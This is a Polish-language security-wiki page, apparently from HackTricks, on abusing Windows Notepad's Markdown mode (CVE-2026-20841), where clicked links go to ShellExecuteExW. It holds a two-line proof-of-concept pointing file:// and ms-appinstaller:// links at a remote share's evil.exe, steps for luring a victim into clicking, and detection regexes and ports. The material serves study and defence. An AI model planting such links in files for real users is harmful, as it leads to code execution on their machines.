# Windows Protocol Handler / ShellExecute Abuse (Markdown Renderers)

{{#include ../banners/hacktricks-training.md}}

Nowoczesne aplikacje Windows, które renderują Markdown/HTML, często zamieniają linki dostarczone przez użytkownika w elementy klikalne i przekazują je do `ShellExecuteExW`. Bez ścisłego allowlistingu schematów, każdy zarejestrowany obsługiwacz protokołu (np. `file:`, `ms-appinstaller:`) może zostać wywołany, prowadząc do wykonania kodu w kontekście bieżącego użytkownika.

## Powierzchnia ShellExecuteExW w trybie Markdown Notepad w Windows
- Notepad wybiera tryb Markdown **tylko dla rozszerzeń `.md`** poprzez porównanie stałego łańcucha w `sub_1400ED5D0()`.
- Obsługiwane linki Markdown:
- Standard: `[text](target)`
- Autolink: `<target>` (renderowane jako `[target](target)`), więc oba sposoby mają znaczenie dla payloadów i detekcji.
- Kliknięcia linków są przetwarzane w `sub_140170F60()`, która wykonuje słabe filtrowanie, a następnie wywołuje `ShellExecuteExW`.
- `ShellExecuteExW` przekazuje do **dowolnego skonfigurowanego obsługiwacza protokołu**, nie tylko HTTP(S).

### Uwagi dotyczące payloadów
- Wszystkie sekwencje `\\` w linku są **normalizowane do `\`** przed `ShellExecuteExW`, co wpływa na konstruowanie UNC/ścieżek i detekcję.
- Pliki `.md` **nie są domyślnie kojarzone z Notepad**; ofiara nadal musi otworzyć plik w Notepad i kliknąć link, ale po wyrenderowaniu link jest klikalny.
- Niebezpieczne przykładowe schematy:
- `file://` aby wywołać lokalny/UNC payload.
- `ms-appinstaller://` aby wywołać przepływy App Installer. Inne lokalnie zarejestrowane schematy również mogą być nadużyte.

### Minimalny PoC Markdown
```markdown
[run](file://\\192.0.2.10\\share\\evil.exe)
<ms-appinstaller://\\192.0.2.10\\share\\pkg.appinstaller>
```
### Przebieg eksploatacji
1. Sporządź plik **`.md`** tak, aby Notepad renderował go jako Markdown.
2. Osadź link używając niebezpiecznego schematu URI (`file:`, `ms-appinstaller:`, lub dowolny zainstalowany obsługiwacz).
3. Dostarcz plik (HTTP/HTTPS/FTP/IMAP/NFS/POP3/SMTP/SMB lub podobne) i przekonaj użytkownika, aby otworzył go w Notepad.
4. Po kliknięciu, **znormalizowany link** jest przekazywany do `ShellExecuteExW` i odpowiedni obsługiwacz protokołu wykonuje wskazaną zawartość w kontekście użytkownika.

## Pomysły na wykrywanie
- Monitoruj transfery plików `.md` przez porty/protokóły, które często dostarczają dokumenty: `20/21 (FTP)`, `80 (HTTP)`, `443 (HTTPS)`, `110 (POP3)`, `143 (IMAP)`, `25/587 (SMTP)`, `139/445 (SMB/CIFS)`, `2049 (NFS)`, `111 (portmap)`.
- Parsuj linki Markdown (standardowe i autolink) i sprawdzaj **bez rozróżnienia wielkości liter** `file:` lub `ms-appinstaller:`.
- Wyrażenia regularne zalecane przez vendorów do wykrywania dostępu do zdalnych zasobów:
```
(\x3C|\[[^\x5d]+\]\()file:(\x2f|\x5c\x5c){4}
(\x3C|\[[^\x5d]+\]\()ms-appinstaller:(\x2f|\x5c\x5c){2}
```
- Zachowanie łatki podobno **allowlists local files and HTTP(S)**; wszystko inne wywołujące `ShellExecuteExW` jest podejrzane. Rozszerz wykrywanie na inne zainstalowane obsługi protokołów w razie potrzeby, ponieważ powierzchnia ataku różni się w zależności od systemu.

## Referencje
- [CVE-2026-20841: Arbitrary Code Execution in the Windows Notepad](https://www.thezdi.com/blog/2026/2/19/cve-2026-20841-arbitrary-code-execution-in-the-windows-notepad)
- [CVE-2026-20841 PoC](https://github.com/BTtea/CVE-2026-20841-PoC)

{{#include ../banners/hacktricks-training.md}}
